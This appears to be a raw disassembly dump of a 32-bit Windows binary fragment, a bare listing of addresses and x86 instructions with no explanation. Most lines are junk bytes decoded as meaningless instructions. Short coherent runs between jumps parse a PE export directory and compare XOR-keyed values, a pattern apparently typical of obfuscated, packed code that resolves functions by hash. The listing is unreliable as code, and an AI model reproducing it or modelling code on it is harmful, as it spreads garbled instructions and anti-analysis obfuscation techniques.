  40ae22:	out    0x9b,eax
  40ae24:	jmp    0x40ae5a
  40ae26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae27:	(bad)  
  40ae28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae29:	aas    
  40ae2a:	xchg   edi,eax
  40ae2b:	xchg   esi,eax
  40ae2c:	xchg   ebp,eax
  40ae2d:	xchg   ebx,eax
  40ae2e:	lods   al,BYTE PTR ds:[esi]
  40ae2f:	lds    edi,FWORD PTR [eax]
  40ae31:	std    
  40ae32:	nop
  40ae33:	xchg   ebx,eax
  40ae34:	in     eax,0xf2
  40ae36:	arpl   si,si
  40ae38:	or     ah,BYTE PTR [edx-0x4b]
  40ae3b:	mov    esp,0xfbc8012f
  40ae40:	jnp    0x40ae13
  40ae42:	es ins DWORD PTR es:[edi],dx
  40ae44:	mov    ?,WORD PTR [edi-0x1a]
  40ae47:	xchg   ebx,eax
  40ae48:	fs or  al,0xa4
  40ae4b:	or     dh,BYTE PTR [eax+0x4660fb64]
  40ae51:	add    ah,BYTE PTR [esi+0x7550f283]
  40ae57:	sbb    al,0xc0
  40ae59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae5a:	leave  
  40ae5b:	ins    DWORD PTR es:[edi],dx
  40ae5c:	aas    
  40ae5d:	imul   DWORD PTR [eax-0x3fcd968b]
  40ae63:	mov    bh,0x3e
  40ae65:	clc    
  40ae66:	pop    esp
  40ae67:	inc    edx
  40ae68:	ss into 
  40ae6a:	nop
  40ae6b:	fisttp DWORD PTR [esp+eiz*8+0x41]
  40ae6f:	fnsave ds:0xe44286b7
  40ae75:	and    ebp,ebx
  40ae77:	es inc eax
  40ae79:	bound  eax,QWORD PTR [esi+ebx*1-0x2fac6823]
  40ae80:	sub    al,0x25
  40ae82:	push   0xffffff91
  40ae84:	xlat   BYTE PTR ds:[ebx]
  40ae85:	ins    BYTE PTR es:[edi],dx
  40ae86:	add    DWORD PTR [ecx],ecx
  40ae88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae89:	and    eax,0x381b15f6
  40ae8e:	daa    
  40ae8f:	bound  eax,QWORD PTR [ebx]
  40ae91:	jns    0x40af07
  40ae93:	fbld   TBYTE PTR [esi]
  40ae95:	out    dx,eax
  40ae96:	iret   
  40ae97:	add    al,0x2f
  40ae99:	out    0xbb,al
  40ae9b:	mov    eax,ds:0xb95d071d
  40aea0:	jle    0x40af03
  40aea2:	outs   dx,DWORD PTR ds:[esi]
  40aea3:	xlat   BYTE PTR ds:[ebx]
  40aea4:	out    0x9e,al
  40aea6:	shr    BYTE PTR [ebp-0x67b5eedf],cl
  40aeac:	fcmovnbe st,st(5)
  40aeae:	xor    eax,0x2ead9cbf
  40aeb3:	mov    eax,0x9aa2af23
  40aeb8:	cmp    BYTE PTR [ebp-0x2fec386d],bh
  40aebe:	dec    ebx
  40aebf:	mov    edi,0xfe4963de
  40aec4:	iretw  
  40aec6:	aad    0x80
  40aec8:	and    DWORD PTR [ecx+0x76],edi
  40aecb:	das    
  40aecc:	test   al,0xe9
  40aece:	in     al,dx
  40aecf:	mov    al,BYTE PTR [ebp+0xc98c7ba]
  40aed5:	mov    DWORD PTR [ebp+0x6a],ecx
  40aed8:	adc    edi,DWORD PTR [ebp-0x402ff8c2]
  40aede:	mov    edi,0xd5f070e5
  40aee3:	fisttp DWORD PTR [ecx+eax*8+0x350958c1]
  40aeea:	jae    0x40ae77
  40aeec:	dec    ebp
  40aeed:	or     al,0x33
  40aeef:	(bad)  
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	pop    eax
  40af6a:	jno    0x40af60
  40af6c:	dec    esp
  40af6d:	inc    esi
  40af6e:	jmp    0x7070:0x7f957070
  40af75:	sar    BYTE PTR [ebx+0x3004c934],0xd9
  40af7c:	ret    0x849a
  40af7f:	pop    es
  40af80:	fs lahf 
  40af82:	ds mov cl,0x65
  40af85:	push   esp
  40af86:	loop   0x40aff3
  40af88:	add    esp,ecx
  40af8a:	xchg   BYTE PTR [edx+0x36],ah
  40af8d:	xlat   BYTE PTR ds:[ebx]
  40af8e:	add    al,0xec
  40af90:	lods   al,BYTE PTR ds:[esi]
  40af91:	inc    eax
  40af92:	xor    ecx,DWORD PTR [edi+edx*8]
  40af95:	bound  edi,QWORD PTR [ebx-0xb]
  40af98:	and    DWORD PTR [ebx],esp
  40af9a:	jae    0x40afd6
  40af9c:	call   0x6b9f861a
  40afa1:	or     edx,DWORD PTR [ebp-0x788f8ff5]
  40afa7:	push   ss
  40afa8:	mov    eax,0xd0c1bbdc
  40afad:	push   edi
  40afae:	inc    ecx
  40afaf:	jo     0x40afc1
  40afb1:	mov    ds:0x8b3f3a4f,eax
  40afb6:	jo     0x40af60
  40afb8:	das    
  40afb9:	fst    st(5)
  40afbb:	retf   0x8452
  40afbe:	mov    eax,ds:0xbab79e38
  40afc3:	pop    edi
  40afc4:	loopne 0x40af64
  40afc6:	push   eax
  40afc7:	jecxz  0x40b02c
  40afc9:	adc    eax,0x85a3e65c
  40afce:	test   DWORD PTR [edi],0x8573c328
  40afd4:	loopne 0x40afcf
  40afd6:	loopne 0x40b051
  40afd8:	cmp    cl,dh
  40afda:	lock add al,0xe8
  40afdd:	push   es
  40afde:	(bad)  
  40afdf:	or     bl,BYTE PTR [ebp+0x4f]
  40afe2:	mov    esi,0x571caf33
  40afe7:	push   edi
  40afe8:	loop   0x40afb5
  40afea:	pop    ebp
  40afeb:	imul   eax,DWORD PTR [esi],0x1fe1d0dd
  40aff1:	fistp  WORD PTR [ecx-0x15]
  40aff4:	lahf   
  40aff5:	fwait
  40aff6:	xchg   esp,eax
  40aff7:	pop    es
  40aff8:	xchg   esi,eax
  40aff9:	or     eax,0x348ee82a
  40affe:	shl    BYTE PTR [eax],0x64
  40b001:	or     DWORD PTR ds:0xdf27ff04,esp
  40b007:	(bad)  
  40b008:	cmp    BYTE PTR [ebx-0x1e],dh
  40b00b:	stc    
  40b00c:	adc    edx,DWORD PTR [ecx+0x38b1a1c1]
  40b012:	cmp    al,0x54
  40b014:	push   esi
  40b015:	aad    0xf5
  40b017:	mov    bh,0xf
  40b019:	xor    dh,BYTE PTR ds:0xa08f5710
  40b01f:	(bad)
  40b023:	sub    dh,BYTE PTR [ebx]
  40b025:	push   edx
  40b026:	xor    BYTE PTR [edi-0x2],dl
  40b029:	pop    ecx
  40b02a:	retf   
  40b02b:	cs out 0xee,al
  40b02e:	ror    BYTE PTR [esi],1
  40b030:	xchg   DWORD PTR [edi+eiz*2+0xa738ad3],eax
  40b037:	cli    
  40b038:	pushf  
  40b039:	or     eax,0x42c3db42
  40b03e:	jns    0x40b091
  40b040:	iret   
  40b041:	aaa    
  40b042:	fistp  WORD PTR [edi-0x70]
  40b045:	jnp    0x40b0ae
  40b047:	popf   
  40b048:	xor    DWORD PTR [ebx+ebx*2],ebx
  40b04b:	retf   
  40b04c:	push   edx
  40b04d:	(bad)  
  40b04e:	or     DWORD PTR ds:0x699c8715,0x3fe6376b
  40b058:	inc    eax
  40b059:	mov    eax,0xb8609aea
  40b05e:	lods   eax,DWORD PTR ds:[esi]
  40b05f:	stos   BYTE PTR es:[edi],al
  40b060:	sti    
  40b061:	cld    
  40b062:	adc    DWORD PTR [ebx+0x2f249cd0],edi
  40b068:	and    DWORD PTR [eax],edx
  40b06a:	test   ah,al
  40b06c:	xchg   ebp,eax
  40b06d:	sub    al,BYTE PTR [ebx+0x3eb5cc07]
  40b073:	and    al,0xe3
  40b075:	cmp    cl,0x6e
  40b078:	inc    edx
  40b079:	outs   dx,BYTE PTR ds:[esi]
  40b07a:	push   ebp
  40b07b:	mov    ah,0x14
  40b07d:	jb     0x40b0e0
  40b07f:	hlt    
  40b080:	(bad)  
  40b081:	cs cs pop es
  40b084:	xor    al,0x7f
  40b086:	dec    esi
  40b087:	test   BYTE PTR [esi+0x2fceebb3],dh
  40b08d:	mov    al,ds:0xd1522498
  40b092:	bound  ebp,QWORD PTR [edi-0x24269e2c]
  40b098:	ret    
  40b099:	and    cl,BYTE PTR [edx+0x7cfc60f1]
  40b09f:	clc    
  40b0a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a1:	mov    esp,0xe294c80c
  40b0a6:	and    BYTE PTR [ecx+0x34ab41b8],cl
  40b0ac:	aas    
  40b0ad:	je     0x40b042
  40b0af:	mov    bh,0xd3
  40b0b1:	cwde   
  40b0b2:	mov    ds:0xeca05b86,eax
  40b0b7:	xchg   DWORD PTR [ecx-0x46],ebx
  40b0ba:	cmp    BYTE PTR [edx+0x6c],0x71
  40b0be:	jo     0x40b056
  40b0c0:	pop    ecx
  40b0c1:	inc    ecx
  40b0c2:	jns    0x40b06c
  40b0c4:	adc    DWORD PTR [edi-0x7e],edi
  40b0c7:	aaa    
  40b0c8:	fwait
  40b0c9:	mov    ecx,0xcb794fa1
  40b0ce:	pushf  
  40b0cf:	jno    0x40b101
  40b0d1:	loop   0x40b0ee
  40b0d3:	cmp    BYTE PTR [ebx+edi*1],ch
  40b0d6:	fimul  WORD PTR [edx+0x4c]
  40b0d9:	arpl   cx,di
  40b0db:	mov    eax,0x540e0870
  40b0e0:	cmp    dh,BYTE PTR [edx-0x56]
  40b0e3:	test   ax,0x2d8b
  40b0e7:	sbb    eax,0x7499d290
  40b0ec:	push   esp
  40b0ed:	scas   eax,DWORD PTR es:[edi]
  40b0ee:	ins    DWORD PTR es:[edi],dx
  40b0ef:	outs   dx,BYTE PTR ds:[esi]
  40b0f0:	das    
  40b0f1:	pop    ebp
  40b0f2:	shr    BYTE PTR [ebx],cl
  40b0f4:	fidivr DWORD PTR [ebx-0x5]
  40b0f7:	add    dh,BYTE PTR [eax]
  40b0f9:	jecxz  0x40b113
  40b0fb:	ret    
  40b0fc:	mov    ah,0x66
  40b0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ff:	std    
  40b100:	push   ds
  40b101:	push   ss
  40b102:	ret    0x8ab5
  40b105:	sar    DWORD PTR [esi],0x72
  40b108:	out    0x46,eax
  40b10a:	push   ecx
  40b10b:	std    
  40b10c:	pop    eax
  40b10d:	sub    al,0xfb
  40b10f:	sub    cl,BYTE PTR [ebx+0x458be84d]
  40b115:	clc    
  40b116:	mov    eax,DWORD PTR [eax]
  40b118:	mov    eax,DWORD PTR [eax+0x3c]
  40b11b:	lea    ecx,[ecx*8+0x78]
  40b122:	add    eax,ecx
  40b124:	mov    ecx,DWORD PTR [ebp-0x8]
  40b127:	mov    ecx,DWORD PTR [ecx]
  40b129:	mov    eax,DWORD PTR [eax+ecx*1]
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	(bad)
  40b14a:	sahf   
  40b14b:	fucomi st,st(0)
  40b14d:	jo     0x40b1bf
  40b14f:	xchg   ebp,eax
  40b150:	jg     0x40b1c2
  40b152:	jo     0x40b0f6
  40b154:	gs call 0x1c77:0x58504fee
  40b15c:	push   edx
  40b15d:	jns    0x40b1a6
  40b15f:	or     dh,BYTE PTR [eax-0x4b]
  40b162:	jno    0x40b0fd
  40b164:	mov    ah,0xbe
  40b166:	ss int3 
  40b168:	aad    0xb8
  40b16a:	shl    BYTE PTR [ecx+0x3966f2a8],1
  40b170:	xor    al,0x79
  40b172:	mov    al,dh
  40b174:	(bad)  
  40b175:	popa   
  40b176:	xor    BYTE PTR [eax+0x50f12770],dl
  40b17c:	sbb    esp,DWORD PTR [edi+0x1e94c383]
  40b182:	retf   0x6c04
  40b185:	fisttp QWORD PTR [edi-0x6da935a6]
  40b18b:	(bad)  
  40b18c:	mul    DWORD PTR [ecx+ecx*8+0x13]
  40b190:	clc    
  40b191:	pop    es
  40b192:	cwde   
  40b193:	cld    
  40b194:	sbb    DWORD PTR [edi+0x5834ec7a],ebp
  40b19a:	and    ebp,DWORD PTR [edx+0x1f693534]
  40b1a0:	cld    
  40b1a1:	adc    eax,0xe7f16306
  40b1a6:	jmp    DWORD PTR [edx+0x5700779b]
  40b1ac:	scas   eax,DWORD PTR es:[edi]
  40b1ad:	out    0x96,eax
  40b1af:	jle    0x40b1ea
  40b1b1:	ins    DWORD PTR es:[edi],dx
  40b1b2:	ret    
  40b1b3:	stos   DWORD PTR es:[edi],eax
  40b1b4:	dec    eax
  40b1b5:	fcmovbe st,st(7)
  40b1b7:	(bad)  
  40b1b9:	jge    0x40b19d
  40b1bb:	xchg   edx,eax
  40b1bc:	sub    bh,ah
  40b1be:	enter  0x917b,0x78
  40b1c2:	imul   esp,DWORD PTR [esi+0x43],0x64d02c33
  40b1c9:	dec    esi
  40b1ca:	data16 mov bl,0x36
  40b1cd:	pop    edx
  40b1ce:	dec    ecx
  40b1cf:	and    dh,bl
  40b1d1:	dec    eax
  40b1d2:	stos   DWORD PTR es:[edi],eax
  40b1d3:	test   BYTE PTR [esp+edi*4+0x4e2d92b0],bh
  40b1da:	xchg   ebp,eax
  40b1db:	imul   edi,DWORD PTR [esi],0xffffffb2
  40b1de:	bound  ebx,QWORD PTR [edi]
  40b1e0:	pusha  
  40b1e1:	xchg   ebx,eax
  40b1e2:	adc    ecx,edi
  40b1e4:	xchg   esi,eax
  40b1e5:	ret    0x607d
  40b1e8:	or     BYTE PTR [eax+0x25],0x98
  40b1ec:	sbb    eax,0x449c89db
  40b1f1:	or     eax,0x2c2ab809
  40b1f6:	inc    esi
  40b1f7:	js     0x40b234
  40b1f9:	mov    eax,0x55930b12
  40b1fe:	scas   eax,DWORD PTR es:[edi]
  40b1ff:	mov    dl,0x5e
  40b201:	xchg   ebx,eax
  40b202:	aam    0x0
  40b204:	or     esp,DWORD PTR [edi-0x10]
  40b207:	cmp    bh,BYTE PTR [edx]
  40b209:	aaa    
  40b20a:	loope  0x40b1af
  40b20c:	inc    edi
  40b20d:	mov    esp,0xb85ed528
  40b212:	lods   eax,DWORD PTR ds:[esi]
  40b213:	imul   eax,DWORD PTR [esi],0x8
  40b216:	jb     0x40b28d
  40b218:	retf   
  40b219:	pop    ebp
  40b21a:	and    DWORD PTR [ecx-0x1e3c38c4],edi
  40b220:	mov    ebp,0x94f8662
  40b225:	sbb    ah,BYTE PTR [esi+0x50b4a871]
  40b22b:	lods   eax,DWORD PTR ds:[esi]
  40b22c:	ds pop esi
  40b22e:	or     BYTE PTR [ebx-0x27],dl
  40b231:	out    0x74,eax
  40b233:	repz aaa 
  40b235:	div    DWORD PTR es:[esi+0x5e]
  40b239:	push   es
  40b23a:	mov    ch,0x21
  40b23c:	inc    edi
  40b23d:	pop    ebp
  40b23e:	or     al,0x90
  40b240:	push   0xffffffb8
  40b242:	push   esi
  40b243:	inc    eax
  40b244:	dec    ecx
  40b245:	popf   
  40b246:	mov    ds:0xcfb19b3c,eax
  40b24b:	out    0xed,eax
  40b24d:	or     eax,DWORD PTR [ebx+edi*2-0x379e3b5e]
  40b254:	jmp    0xd26c:0x5366a5d7
  40b25b:	add    eax,0xd74f9bdc
  40b260:	mov    dl,0xf
  40b262:	mov    edx,0xaf1da8c5
  40b267:	or     esp,DWORD PTR ds:0xc490f31a
  40b26d:	push   eax
  40b26e:	dec    esp
  40b26f:	lahf   
  40b270:	mov    al,0x84
  40b272:	mov    edi,0x42ff13ab
  40b277:	aad    0xc3
  40b279:	scas   eax,DWORD PTR es:[edi]
  40b27a:	sti    
  40b27b:	add    esi,DWORD PTR [eax+edi*4+0x61]
  40b27f:	call   0xf7c2:0x6a585efa
  40b286:	mov    cl,0x87
  40b288:	cmc    
  40b289:	test   ch,0x56
  40b28c:	jmp    0x40b229
  40b28e:	and    al,0xaa
  40b290:	nop
  40b291:	mov    ecx,0x15e57280
  40b296:	cmp    BYTE PTR [ebx+eiz*4],bh
  40b299:	xchg   ebx,eax
  40b29a:	jmp    0xa8ba:0x45dd4497
  40b2a1:	pop    eax
  40b2a2:	pop    esp
  40b2a3:	das    
  40b2a4:	lahf   
  40b2a5:	repz mov ah,0x81
  40b2a8:	loope  0x40b321
  40b2aa:	jg     0x40b244
  40b2ac:	hlt    
  40b2ad:	repnz mov ah,0x33
  40b2b0:	div    BYTE PTR [edi-0x51d7bdbd]
  40b2b6:	or     DWORD PTR [esi],0xd35a0f91
  40b2bc:	fsubr  DWORD PTR [eax+0xc62cbbe]
  40b2c2:	mov    WORD PTR [esi+0x60],cs
  40b2c5:	loope  0x40b276
  40b2c7:	jecxz  0x40b335
  40b2c9:	adc    DWORD PTR [eax+0x1a],ecx
  40b2cc:	push   0x6ac9897c
  40b2d1:	jns    0x40b253
  40b2d3:	add    eax,0x6991703f
  40b2d8:	cwde   
  40b2d9:	ror    BYTE PTR [ebx+0x66b8dcbb],cl
  40b2df:	repz push ecx
  40b2e1:	int3   
  40b2e2:	inc    ecx
  40b2e3:	mov    ebx,0xa6728f48
  40b2e8:	push   ebx
  40b2e9:	xchg   esp,eax
  40b2ea:	es iret 
  40b2ec:	popa   
  40b2ed:	add    cl,BYTE PTR [ecx-0x4c1623bb]
  40b2f3:	add    DWORD PTR [eax],eax
  40b2f5:	add    BYTE PTR [ecx+0x71e4f104],dh
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0xa2dbadc9
  40b303:	adc    esp,DWORD PTR [edi+0x70f6708a]
  40b309:	jo     0x40b2a0
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b2f8
  40b30f:	iret   
  40b310:	repz push edi
  40b312:	sub    al,0x64
  40b314:	jp     0x40b2f7
  40b316:	fwait
  40b317:	inc    esi
  40b318:	in     eax,0x95
  40b31a:	or     BYTE PTR [ecx],0xcc
  40b31d:	adc    al,bl
  40b31f:	pop    ss
  40b320:	push   0xffffffe7
  40b322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b323:	push   cs
  40b324:	jecxz  0x40b337
  40b326:	lods   eax,DWORD PTR ds:[esi]
  40b327:	in     eax,dx
  40b328:	jns    0x40b357
  40b32a:	cmp    al,0xd9
  40b32c:	dec    ebp
  40b32d:	retf   
  40b32e:	js     0x40b35e
  40b330:	xor    al,ah
  40b332:	mov    al,bh
  40b334:	mov    edi,0x76ee5d98
  40b339:	dec    ecx
  40b33a:	stos   DWORD PTR es:[edi],eax
  40b33b:	sbb    ecx,DWORD PTR [ecx-0x6a95214a]
  40b341:	push   es
  40b342:	das    
  40b343:	aas    
  40b344:	cmp    bl,BYTE PTR [eax+0x475fed00]
  40b34a:	jmp    0x40b319
  40b34c:	sbb    BYTE PTR [ebx+0x7c],cl
  40b34f:	add    cl,ch
  40b351:	cmp    esp,ecx
  40b353:	sahf   
  40b354:	lds    eax,FWORD PTR ds:0xd5c17b2f
  40b35a:	dec    ebx
  40b35b:	jae    0x40b320
  40b35d:	jecxz  0x40b32a
  40b35f:	call   0xcbb68e7
  40b364:	test   BYTE PTR [edx-0x64e737a9],0x80
  40b36b:	add    dl,BYTE PTR ds:0xd46e163a
  40b371:	and    esi,ebx
  40b373:	mov    ds:0x42ee4472,al
  40b378:	push   edi
  40b379:	dec    ebp
  40b37a:	cmp    ebx,esi
  40b37c:	test   eax,0x50afcedf
  40b381:	mov    al,0xe3
  40b383:	xor    bh,BYTE PTR [ecx]
  40b385:	mov    ss,WORD PTR [esi+0x6faaf78e]
  40b38b:	in     eax,0x4a
  40b38d:	daa    
  40b38e:	mov    esp,0x11d6e099
  40b393:	iret   
  40b394:	clc    
  40b395:	and    ah,BYTE PTR [edi-0x6b37344d]
  40b39b:	mov    ch,0xa4
  40b39d:	loope  0x40b3a0
  40b39f:	(bad)  
  40b3a0:	push   ebx
  40b3a1:	push   0x51
  40b3a3:	retf   
  40b3a4:	sar    bh,0x60
  40b3a7:	and    esp,ecx
  40b3a9:	sbb    ebp,DWORD PTR [edi+eax*8-0x5c]
  40b3ad:	mov    ebx,0x90165e93
  40b3b2:	outs   dx,DWORD PTR ds:[esi]
  40b3b3:	mov    bl,0x34
  40b3b5:	(bad)  
  40b3b6:	dec    esi
  40b3b7:	mov    ah,BYTE PTR [esi+0xb028396]
  40b3bd:	sbb    DWORD PTR [eax],edi
  40b3bf:	je     0x40b3c2
  40b3c1:	(bad)  
  40b3c2:	jmp    0x15931222
  40b3c7:	or     eax,DWORD PTR [edi]
  40b3c9:	xor    cl,BYTE PTR [ebx+0x5cf860b2]
  40b3cf:	clc    
  40b3d0:	pinsrw mm1,WORD PTR [esi+0x3d],0x84
  40b3d5:	popf   
  40b3d6:	rcl    dh,1
  40b3d8:	(bad)  
  40b3d9:	loop   0x40b3a5
  40b3db:	push   ecx
  40b3dc:	jp     0x40b3ac
  40b3de:	loopne 0x40b401
  40b3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e1:	scas   eax,DWORD PTR es:[edi]
  40b3e2:	sub    eax,0xf2cac58a
  40b3e7:	ret    
  40b3e8:	inc    esi
  40b3e9:	and    dh,BYTE PTR [ecx]
  40b3eb:	jmp    0x40b3fe
  40b3ed:	sbb    DWORD PTR [edx-0x36],esp
  40b3f0:	repnz mov eax,ds:0x55853f2a
  40b3f6:	cmp    al,0xa7
  40b3f8:	scas   al,BYTE PTR es:[edi]
  40b3f9:	maxps  xmm6,xmm7
  40b3fc:	pop    eax
  40b3fd:	int    0x2a
  40b3ff:	div    DWORD PTR [ecx]
  40b401:	cmp    DWORD PTR [ebx],edi
  40b403:	lods   al,BYTE PTR ds:[esi]
  40b404:	inc    esi
  40b405:	call   0x51c6954b
  40b40a:	or     al,0xe9
  40b40c:	cmp    BYTE PTR [ebx+0x1782ebc1],cl
  40b412:	clc    
  40b413:	mov    ah,0x1a
  40b415:	daa    
  40b416:	push   es
  40b417:	scas   eax,DWORD PTR es:[edi]
  40b418:	repnz or ebx,ebx
  40b41b:	sub    BYTE PTR [ebp-0x21],al
  40b41e:	xor    DWORD PTR [ebp-0x5aec9097],ebp
  40b424:	dec    ebp
  40b425:	cmp    eax,0x4e1041d
  40b42a:	and    ch,BYTE PTR [ebp-0x2]
  40b42d:	pop    edi
  40b42e:	ffree  st(1)
  40b430:	xchg   ebx,eax
  40b431:	fiadd  DWORD PTR [ebp-0x68]
  40b434:	fstp   TBYTE PTR [edx-0x3f]
  40b437:	sbb    al,0xd7
  40b439:	jmp    FWORD PTR [edx-0x71883f04]
  40b43f:	shl    DWORD PTR [esi+edx*2],1
  40b442:	cli    
  40b443:	jecxz  0x40b3d1
  40b445:	es stos BYTE PTR es:[edi],al
  40b447:	push   edx
  40b448:	jns    0x40b405
  40b44a:	cmp    cl,BYTE PTR [esi+eax*1]
  40b44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b44f:	or     al,0x3f
  40b451:	cwde   
  40b452:	jnp    0x40b457
  40b454:	into   
  40b455:	jl     0x40b422
  40b457:	aaa    
  40b458:	xchg   ebx,eax
  40b459:	mov    ah,0x64
  40b45b:	cwde   
  40b45c:	sub    ch,BYTE PTR [ecx-0x6a]
  40b45f:	push   ds
  40b460:	push   esi
  40b461:	scas   al,BYTE PTR es:[edi]
  40b462:	and    DWORD PTR [ebp+0x19],esp
  40b465:	ins    BYTE PTR es:[edi],dx
  40b466:	jne    0x40b3ef
  40b468:	push   ebp
  40b469:	cmp    edi,DWORD PTR [ecx]
  40b46b:	dec    ecx
  40b46c:	xor    DWORD PTR [ebx-0x74],edx
  40b46f:	inc    cx
  40b471:	jmp    DWORD PTR [eax-0x782f10a4]
  40b477:	test   DWORD PTR [ebp+0x2b],edi
  40b47a:	xchg   BYTE PTR ds:0xd1b6a67b,bl
  40b480:	sbb    ah,0xf5
  40b483:	xor    edx,edi
  40b485:	leave  
  40b486:	ret    
  40b487:	add    BYTE PTR [edx+0x36aaf1b6],bh
  40b48d:	pop    edx
  40b48e:	out    dx,al
  40b48f:	imul   esp,DWORD PTR [ebx-0x525634e9],0x479274e2
  40b499:	xchg   esp,eax
  40b49a:	ret    0xa5f3
  40b49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49e:	adc    BYTE PTR [edi+eiz*8],dh
  40b4a1:	lahf   
  40b4a2:	setno  BYTE PTR [eax]
  40b4a5:	test   eax,0x8b38a6d6
  40b4aa:	inc    ebp
  40b4ab:	or     BYTE PTR [ebx-0x39cc1fb3],cl
  40b4b1:	add    eax,edi
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0xf5413075
  40b4de:	ss dec dl
  40b4e1:	xchg   ebp,eax
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b4d3
  40b4ea:	xchg   esi,eax
  40b4eb:	loopne 0x40b4f9
  40b4ed:	inc    esp
  40b4ee:	imul   eax,DWORD PTR [ecx],0xffffffda
  40b4f1:	call   0x9fad1f52
  40b4f6:	ret    0xc373
  40b4f9:	stc    
  40b4fa:	test   BYTE PTR [edx],bh
  40b4fc:	jmp    0xfdd7658e
  40b501:	dec    esp
  40b502:	mov    ecx,0xed2a86f
  40b507:	jmp    0x3bbc:0x5819a9be
  40b50e:	mov    ah,BYTE PTR [ecx+eiz*8-0x3]
  40b512:	cmp    al,0x1a
  40b514:	mov    dh,0x41
  40b516:	xor    DWORD PTR [eax+0xe85b430],ebx
  40b51c:	bswap  esi
  40b51e:	lea    esp,[ebp+0x5f]
  40b521:	ds (bad) 
  40b524:	jle    0x40b547
  40b526:	aas    
  40b527:	rcl    bl,1
  40b529:	mov    ecx,0x1bf00460
  40b52e:	jp     0x40b5a2
  40b530:	inc    edx
  40b531:	movmskps esp,xmm3
  40b534:	push   cs
  40b535:	mov    ch,0xe8
  40b537:	and    BYTE PTR [edx+0x6c],cl
  40b53a:	outs   dx,DWORD PTR ds:[esi]
  40b53b:	rcl    BYTE PTR [esi],cl
  40b53d:	mov    eax,ds:0x4bab2288
  40b542:	je     0x40b55c
  40b544:	and    bl,ah
  40b546:	test   DWORD PTR [esi],ecx
  40b548:	jne    0x40b59a
  40b54a:	ret    
  40b54b:	ins    DWORD PTR es:[edi],dx
  40b54c:	mov    eax,ds:0x3b47c131
  40b551:	jge    0x40b5ce
  40b553:	aaa    
  40b554:	(bad)  
  40b555:	jl     0x40b553
  40b557:	mov    ah,0x30
  40b559:	pop    ebx
  40b55a:	outs   dx,BYTE PTR ds:[esi]
  40b55b:	int    0x78
  40b55d:	dec    edi
  40b55e:	fbld   TBYTE PTR [ebx+0x71]
  40b561:	(bad)  
  40b563:	pushf  
  40b564:	repnz inc esp
  40b566:	(bad)  
  40b567:	mov    eax,ds:0xd74535b0
  40b56c:	jp     0x40b539
  40b56e:	push   eax
  40b56f:	and    BYTE PTR [bp+di-0x5f31],bh
  40b574:	adc    edx,DWORD PTR [edi+ebx*2+0x665d7582]
  40b57b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b57c:	mov    bh,0x20
  40b57e:	scas   eax,DWORD PTR es:[edi]
  40b57f:	xchg   ebx,eax
  40b580:	xor    eax,0x4ba9615f
  40b585:	pop    es
  40b586:	xor    al,0x17
  40b588:	mov    dl,0xc2
  40b58a:	add    esi,DWORD PTR [ebx-0x629bf0e1]
  40b590:	pop    ebp
  40b591:	sub    al,0x69
  40b593:	lods   al,BYTE PTR ds:[esi]
  40b594:	mov    dh,0x34
